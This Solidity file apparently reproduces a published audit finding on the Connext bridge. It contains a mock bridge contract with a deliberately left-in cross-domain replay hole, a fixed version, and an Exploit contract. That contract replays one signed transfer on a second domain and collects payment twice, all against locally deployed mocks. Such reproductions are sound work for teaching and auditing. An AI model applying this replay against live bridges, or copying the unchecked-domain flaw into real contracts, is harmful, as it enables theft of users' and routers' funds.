// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// Connext H-06 (Code4rena 2022-06). Router signatures cover transferId, and
// _getTransferId resolves every local USDC to the same canonical id. execute
// never checks s.domain against CallParams.destinationDomain, so the same
// fast-transfer pays router liquidity on a second domain.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TokenRegistry {
    bytes32 public constant CANONICAL_USDC = keccak256("USDC");
    mapping(address => bool) public registered;

    function register(address local) external {
        registered[local] = true;
    }

    /// Any registered local representation maps to the same canonical id.
    function getTokenId(address local) external view returns (uint32 tokenDomain, bytes32 tokenId) {
        require(registered[local], "local");
        tokenDomain = 1;
        tokenId = CANONICAL_USDC;
    }
}

struct CallParams {
    uint32 destinationDomain;
    address recipient;
    uint256 pathLength;
}

struct ExecuteArgs {
    CallParams params;
    address local;
    address[] routers;
    bytes32[] routerSignatures;
    uint256 amount;
    uint256 nonce;
    address originSender;
}

contract BridgeFacet {
    TokenRegistry public registry;
    Erc20 public usdc;
    uint32 public domain;
    mapping(bytes32 => bool) public executed;
    uint256 public paidOut;
    uint32 public seenDomain;

    constructor(TokenRegistry _registry, Erc20 _usdc, uint32 _domain) {
        registry = _registry;
        usdc = _usdc;
        domain = _domain;
    }

    function previewTransferId(ExecuteArgs calldata _args) external view returns (bytes32) {
        (uint32 tokenDomain, bytes32 tokenId) = registry.getTokenId(_args.local);
        return _calculateTransferId(_args, tokenId, tokenDomain);
    }

    function _calculateTransferId(ExecuteArgs calldata _args, bytes32 tokenId, uint32 tokenDomain)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(
            abi.encode(
                _args.params.destinationDomain,
                _args.params.recipient,
                _args.params.pathLength,
                _args.amount,
                _args.nonce,
                tokenId,
                tokenDomain,
                _args.originSender
            )
        );
    }

    /// BridgeFacet.execute. Domain is not compared to params.destinationDomain.
    function execute(ExecuteArgs calldata _args) external {
        (uint32 tokenDomain, bytes32 tokenId) = registry.getTokenId(_args.local);
        bytes32 transferId = _calculateTransferId(_args, tokenId, tokenDomain);
        require(_args.routerSignatures[0] == transferId, "router sig");
        require(!executed[transferId], "replayed");
        executed[transferId] = true;
        seenDomain = domain;
        // @> VULN: s.domain is not checked against CallParams.destinationDomain
        require(usdc.transfer(_args.params.recipient, _args.amount), "pay");
        paidOut += _args.amount;
    }
}

contract BridgeFacetFixed {
    TokenRegistry public registry;
    Erc20 public usdc;
    uint32 public domain;
    mapping(bytes32 => bool) public executed;
    uint256 public paidOut;

    constructor(TokenRegistry _registry, Erc20 _usdc, uint32 _domain) {
        registry = _registry;
        usdc = _usdc;
        domain = _domain;
    }

    function _calculateTransferId(ExecuteArgs calldata _args, bytes32 tokenId, uint32 tokenDomain)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(
            abi.encode(
                _args.params.destinationDomain,
                _args.params.recipient,
                _args.params.pathLength,
                _args.amount,
                _args.nonce,
                tokenId,
                tokenDomain,
                _args.originSender
            )
        );
    }

    function execute(ExecuteArgs calldata _args) external {
        require(domain == _args.params.destinationDomain, "domain");
        (uint32 tokenDomain, bytes32 tokenId) = registry.getTokenId(_args.local);
        bytes32 transferId = _calculateTransferId(_args, tokenId, tokenDomain);
        require(_args.routerSignatures[0] == transferId, "router sig");
        require(!executed[transferId], "replayed");
        executed[transferId] = true;
        require(usdc.transfer(_args.params.recipient, _args.amount), "pay");
        paidOut += _args.amount;
    }
}

contract Exploit {
    uint256 internal constant AMOUNT = 1000 ether;
    address internal constant O_USDC = address(0x111111111111111111111111111111111111000a);
    address internal constant POS_USDC = address(0x111111111111111111111111111111111111000B);
    uint32 internal constant OPTIMISM = 10;
    uint32 internal constant POLYGON = 137;

    Erc20 public usdc;
    TokenRegistry public registry;
    BridgeFacet public optimism;
    BridgeFacet public polygon;

    constructor() {
        usdc = new Erc20("USDC");
        registry = new TokenRegistry();
        optimism = new BridgeFacet(registry, usdc, OPTIMISM);
        polygon = new BridgeFacet(registry, usdc, POLYGON);
        registry.register(O_USDC);
        registry.register(POS_USDC);
        usdc.mint(address(optimism), AMOUNT);
        usdc.mint(address(polygon), AMOUNT);
    }

    function _args(address local) internal view returns (ExecuteArgs memory args) {
        args.params = CallParams({destinationDomain: OPTIMISM, recipient: address(this), pathLength: 1});
        args.local = local;
        args.routers = new address[](1);
        args.routers[0] = address(0xB0B);
        args.routerSignatures = new bytes32[](1);
        args.amount = AMOUNT;
        args.nonce = 7;
        args.originSender = address(this);
    }

    function run() external {
        ExecuteArgs memory onOptimism = _args(O_USDC);
        bytes32 transferId = optimism.previewTransferId(onOptimism);
        onOptimism.routerSignatures[0] = transferId;
        optimism.execute(onOptimism);

        ExecuteArgs memory onPolygon = _args(POS_USDC);
        require(polygon.previewTransferId(onPolygon) == transferId, "transferId");
        onPolygon.routerSignatures[0] = transferId;
        polygon.execute(onPolygon);

        require(usdc.balanceOf(address(this)) == 2000 ether, "drained");
        require(optimism.paidOut() == AMOUNT, "opt");
        require(polygon.paidOut() == AMOUNT, "pol");
        require(polygon.seenDomain() == POLYGON, "domain");
    }
}
